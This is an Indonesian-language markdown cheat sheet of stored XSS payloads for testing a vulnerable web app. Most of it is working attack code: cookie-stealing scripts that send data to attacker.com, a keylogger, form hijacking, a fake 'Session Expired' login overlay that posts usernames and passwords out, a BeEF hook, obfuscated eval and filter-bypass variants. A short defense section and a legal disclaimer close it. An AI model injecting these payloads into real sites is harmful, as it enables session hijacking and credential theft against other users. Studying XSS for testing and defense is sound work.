# 🎯 XSS Payload Examples

File ini berisi contoh-contoh payload untuk testing Stored XSS vulnerability.

## Basic XSS Payloads

### 1. Simple Alert
```html
<script>alert('XSS')</script>
```

### 2. Alert with Document Info
```html
<script>alert(document.domain)</script>
```

### 3. Alert with Cookie
```html
<script>alert(document.cookie)</script>
```

## Cookie Stealing Payloads

### 4. Redirect dengan Cookie
```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

### 5. Fetch API untuk Steal Cookie
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

### 6. Image Tag dengan Cookie Stealing
```html
<img src=x onerror="fetch('http://attacker.com/log?cookie='+document.cookie)">
```

## Advanced XSS Payloads

### 7. Keylogger
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

### 8. Form Hijacking
```html
<script>
document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    var data = new FormData(this);
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: data
    });
});
</script>
```

### 9. Phishing Overlay
```html
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"><h1>Session Expired</h1><form onsubmit="fetch(\'http://attacker.com/phish\',{method:\'POST\',body:JSON.stringify({u:this.username.value,p:this.password.value})});return false;"><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button>Login</button></form></div>';
</script>
```

### 10. BeEF Hook
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

## DOM-based XSS Payloads

### 11. Inject Script via innerHTML
```html
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
```
*Note: atob() decodes base64, payload di atas adalah alert('XSS');*

### 12. Event Handler XSS
```html
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

## Bypassing Filters

### 13. Case Variation
```html
<ScRiPt>alert('XSS')</ScRiPt>
```

### 14. Encoded Payload
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

### 15. JavaScript Protocol
```html
<a href="javascript:alert('XSS')">Click me</a>
```

### 16. Data URI
```html
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

## Testing Steps

1. **Login ke aplikasi** sebagai user manapun
2. **Buat post** dengan salah satu payload di atas
3. **Refresh halaman** untuk melihat stored XSS dieksekusi
4. **Perhatikan** bahwa payload tersimpan dan akan dieksekusi untuk semua user

## Cookie Stealing Demo

Untuk test cookie stealing dengan server sederhana:

### Setup Simple HTTP Server (Python)
```bash
# Terminal 1: Start simple HTTP server untuk terima cookie
python -m http.server 8000
```

Kemudian gunakan payload:
```html
<script>
fetch('http://localhost:8000/stolen?cookie=' + document.cookie)
</script>
```

Cek terminal Python untuk melihat cookie yang dicuri.

## Defense Mechanisms

Untuk mencegah XSS:

1. **Input Sanitization**
   - Strip semua HTML tags
   - Whitelist karakter yang diizinkan
   - Gunakan library seperti DOMPurify atau sanitize-html

2. **Output Encoding**
   - Encode HTML entities sebelum render
   - Gunakan textContent bukan innerHTML
   - Template engine dengan auto-escaping

3. **Content Security Policy (CSP)**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **HttpOnly Cookies**
   ```javascript
   res.cookie('session', token, { httpOnly: true });
   ```

## ⚠️ Disclaimer

Payload ini hanya untuk tujuan pembelajaran dan ethical hacking pada sistem yang Anda miliki atau memiliki izin untuk test. Penggunaan tanpa izin adalah ILEGAL.
